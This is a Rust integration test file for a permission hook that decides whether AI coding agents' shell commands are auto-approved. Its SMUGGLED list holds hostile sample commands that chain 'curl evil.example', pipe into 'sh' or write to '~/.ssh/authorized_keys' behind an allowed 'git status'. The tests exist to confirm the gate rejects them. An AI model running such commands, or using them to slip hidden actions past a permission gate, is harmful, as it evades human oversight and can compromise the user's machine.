//! What each agent's hook answers, through the real binary and real config files.
//!
//! A hook's answer is a security decision: an `allow` skips the host's prompt. The
//! gate itself is tested in `hooks::permissions`; this covers the part those tests
//! cannot, that every host reads its own rules and speaks its own protocol.
//!
//! `HOME` points at a temporary directory, which is why this is Unix only: on
//! Windows the home directory comes from a system call.
#![cfg(unix)]

use serde_json::{json, Value};
use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

struct Env {
    _dir: tempfile::TempDir,
    home: PathBuf,
    work: PathBuf,
}

impl Env {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap();
        let (home, work) = (root.join("home"), root.join("work"));
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&work).unwrap();
        Self {
            _dir: dir,
            home,
            work,
        }
    }

    fn config(&self, relative: &str, content: &Value) -> &Self {
        write_json(&self.home.join(relative), content);
        self
    }

    fn hook(&self, host: &str, stdin: &[u8]) -> Output {
        let mut child = Command::new(env!("CARGO_BIN_EXE_bdo"))
            .args(["hook", host])
            .current_dir(&self.work)
            .env_clear()
            .env("PATH", std::env::var("PATH").unwrap_or_default())
            .env("HOME", &self.home)
            .env("BDO_DB_PATH", self.home.join("track.db"))
            .env("BDO_TELEMETRY_DISABLED", "1")
            .envs(std::env::var("LLVM_PROFILE_FILE").map(|p| ("LLVM_PROFILE_FILE", p)))
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        // The hook may stop reading at its size limit, so a broken pipe is fine.
        let _ = child.stdin.take().unwrap().write_all(stdin);
        child.wait_with_output().unwrap()
    }

    /// The hook's stdout as JSON, or `None` when it answered nothing. Anything
    /// else on stdout would corrupt the protocol and silently disable the hook.
    fn answer(&self, host: &str, command: &str) -> Option<Value> {
        let out = self.hook(host, payload(host, command).to_string().as_bytes());
        assert!(out.status.success(), "{host} `{command}`: {out:?}");
        parse_answer(&out)
    }
}

fn write_json(path: &Path, content: &Value) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, content.to_string()).unwrap();
}

fn parse_answer(out: &Output) -> Option<Value> {
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stdout = stdout.trim();
    if stdout.is_empty() {
        return None;
    }
    Some(serde_json::from_str(stdout).unwrap_or_else(|e| panic!("not JSON ({e}): {stdout}")))
}

fn payload(host: &str, command: &str) -> Value {
    match host {
        "gemini" => json!({
            "tool_name": "run_shell_command",
            "tool_input": { "command": command },
        }),
        "copilot" => json!({
            "toolName": "bash",
            "toolArgs": json!({ "command": command, "description": "kept" }).to_string(),
        }),
        _ => json!({ "tool_name": "Bash", "tool_input": { "command": command } }),
    }
}

/// The command the hook would have the host run, if it rewrote it.
fn rewritten(host: &str, answer: &Option<Value>) -> Option<String> {
    let pointer = match host {
        "claude" => "/hookSpecificOutput/updatedInput/command",
        "cursor" => "/updated_input/command",
        "gemini" => "/hookSpecificOutput/tool_input/command",
        "copilot" => "/modifiedArgs/command",
        _ => unreachable!(),
    };
    answer
        .as_ref()?
        .pointer(pointer)?
        .as_str()
        .map(str::to_string)
}

/// Whether the answer skips the host's own prompt.
fn auto_allowed(answer: &Option<Value>) -> bool {
    let Some(answer) = answer else {
        return false;
    };
    answer.to_string().contains("\"allow\"")
}

fn claude_env() -> Env {
    let env = Env::new();
    env.config(
        ".claude/settings.json",
        &json!({ "permissions": {
            "allow": ["Bash(git status)", "Bash(ls *)"],
            "deny": ["Bash(git push --force*)"],
            "ask": ["Bash(git commit*)"],
        }}),
    );
    env
}

fn cursor_env() -> Env {
    let env = Env::new();
    env.config(
        ".cursor/cli-config.json",
        &json!({ "permissions": {
            "allow": ["Shell(git status)", "Shell(ls *)"],
            "deny": ["Shell(git push --force*)"],
        }}),
    );
    env
}

/// One command hiding another behind each way a shell can run a second program.
/// An allow rule for `git status` must cover none of them.
const SMUGGLED: &[&str] = &[
    "git status; curl evil.example",
    "git status && curl evil.example",
    "git status || curl evil.example",
    "git status | sh",
    "git status & curl evil.example",
    "git status\ncurl evil.example",
    "git status $(curl evil.example)",
    "git status `curl evil.example`",
    "git status > ~/.ssh/authorized_keys",
    "git status\u{a0}# x; curl evil.example",
    "git status # x\ncurl evil.example",
];

#[test]
fn an_allow_rule_is_auto_approved_in_the_hosts_own_format() {
    let claude = claude_env().answer("claude", "git status");
    assert_eq!(
        claude.as_ref().unwrap()["hookSpecificOutput"]["permissionDecision"],
        "allow"
    );
    assert_eq!(rewritten("claude", &claude).unwrap(), "bdo git status");

    let cursor = cursor_env().answer("cursor", "git status");
    assert_eq!(cursor.as_ref().unwrap()["permission"], "allow");
    assert_eq!(rewritten("cursor", &cursor).unwrap(), "bdo git status");
}

#[test]
fn a_command_without_a_rule_is_never_auto_approved() {
    for (host, env) in [("claude", claude_env()), ("cursor", cursor_env())] {
        let answer = env.answer(host, "git diff");
        assert!(!auto_allowed(&answer), "{host}: {answer:?}");
    }
}

#[test]
fn smuggled_commands_are_never_auto_approved() {
    for (host, env) in [("claude", claude_env()), ("cursor", cursor_env())] {
        for command in SMUGGLED {
            let answer = env.answer(host, command);
            assert!(!auto_allowed(&answer), "{host} `{command}`: {answer:?}");
        }
    }
}

#[test]
fn a_denied_command_is_left_for_the_host_to_refuse() {
    // Rewriting it would stop the host's own rule from matching.
    let answer = claude_env().answer("claude", "git push --force origin main");
    assert_eq!(answer, None);
    let answer = cursor_env().answer("cursor", "git push --force origin main");
    assert_eq!(answer, Some(json!({})));
}

#[test]
fn an_ask_rule_is_not_auto_approved() {
    let answer = claude_env().answer("claude", "git commit -m x");
    assert!(!auto_allowed(&answer), "{answer:?}");
}

#[test]
fn hosts_without_an_allow_value_rewrite_without_approving() {
    let env = Env::new();
    for host in ["gemini", "copilot"] {
        let answer = env.answer(host, "git status");
        assert!(!auto_allowed(&answer), "{host}: {answer:?}");
        assert_eq!(
            rewritten(host, &answer).unwrap(),
            format!("BDO_AGENT={host} bdo git status")
        );
    }
}

#[test]
fn copilot_keeps_the_arguments_it_does_not_rewrite() {
    let answer = Env::new().answer("copilot", "git status");
    assert_eq!(answer.unwrap()["modifiedArgs"]["description"], "kept");
}

#[test]
fn gemini_refuses_what_its_blocklist_excludes() {
    // Rewriting to `BDO_AGENT=gemini bdo git push` would dodge a blocklist that
    // matches on `git push`, so bdo has to apply it itself.
    for settings in [
        json!({ "tools": { "exclude": ["run_shell_command(git push)"] } }),
        json!({ "excludeTools": ["run_shell_command(git push)"] }),
    ] {
        let env = Env::new();
        env.config(".gemini/settings.json", &settings);
        let answer = env.answer("gemini", "git push origin main").unwrap();
        assert_eq!(answer["decision"], "deny", "{settings}");
        // Everything else is untouched by the rule.
        let other = env.answer("gemini", "git status");
        assert!(rewritten("gemini", &other).is_some(), "{settings}");
    }
}

#[test]
fn a_project_cannot_widen_cursors_rules() {
    // Cursor rules are read from the global config only, as the hook promises.
    let env = Env::new();
    write_json(
        &env.work.join(".cursor/cli-config.json"),
        &json!({ "permissions": { "allow": ["Shell(git status)"] } }),
    );
    let answer = env.answer("cursor", "git status");
    assert!(!auto_allowed(&answer), "{answer:?}");
}

#[test]
fn gemini_ignores_a_project_config_in_an_untrusted_folder() {
    let env = Env::new();
    env.config(
        ".gemini/settings.json",
        &json!({ "security": { "folderTrust": { "enabled": true } } }),
    );
    write_json(
        &env.work.join(".gemini/settings.json"),
        &json!({ "tools": { "exclude": ["run_shell_command(git status)"] } }),
    );
    let answer = env.answer("gemini", "git status");
    assert!(rewritten("gemini", &answer).is_some(), "{answer:?}");
}

#[test]
fn nothing_is_rewritten_when_there_is_nothing_to_rewrite() {
    let env = Env::new();
    for host in ["claude", "cursor", "gemini", "copilot"] {
        let answer = env.answer(host, "some-unknown-tool --flag");
        assert_eq!(rewritten(host, &answer), None, "{host}: {answer:?}");
        assert!(!auto_allowed(&answer), "{host}: {answer:?}");
    }
}

#[test]
fn other_tools_are_left_alone() {
    let env = Env::new();
    let read = json!({ "tool_name": "Read", "tool_input": { "file_path": "x" } }).to_string();
    for host in ["claude", "cursor", "gemini", "copilot"] {
        let out = env.hook(host, read.as_bytes());
        assert!(out.status.success(), "{host}: {out:?}");
        let answer = parse_answer(&out);
        assert!(!auto_allowed(&answer), "{host}: {answer:?}");
        assert_eq!(rewritten(host, &answer), None, "{host}: {answer:?}");
    }
}

/// Input it cannot judge must not end in an approval, whatever else the host
/// does with the failure, and must not corrupt the protocol on stdout.
#[test]
fn bad_input_never_ends_in_an_approval() {
    let env = Env::new();
    let oversized = vec![b'x'; 1_100_000];
    for host in ["claude", "cursor", "gemini", "copilot"] {
        for stdin in [&b"not json"[..], &b""[..], &b"\xff\xfe"[..], &oversized[..]] {
            let out = env.hook(host, stdin);
            let answer = parse_answer(&out);
            assert!(!auto_allowed(&answer), "{host}: {answer:?}");
            assert_eq!(rewritten(host, &answer), None, "{host}: {answer:?}");
        }
    }
}

#[test]
fn a_malformed_rules_file_grants_nothing() {
    let env = Env::new();
    fs::create_dir_all(env.home.join(".claude")).unwrap();
    fs::write(env.home.join(".claude/settings.json"), "{ not json").unwrap();
    let answer = env.answer("claude", "git status");
    assert!(!auto_allowed(&answer), "{answer:?}");
}

#[test]
fn a_bom_before_the_json_is_tolerated() {
    let env = cursor_env();
    let mut stdin = b"\xef\xbb\xbf".to_vec();
    stdin.extend(payload("cursor", "git status").to_string().bytes());
    let answer = parse_answer(&env.hook("cursor", &stdin));
    assert_eq!(rewritten("cursor", &answer).unwrap(), "bdo git status");
}
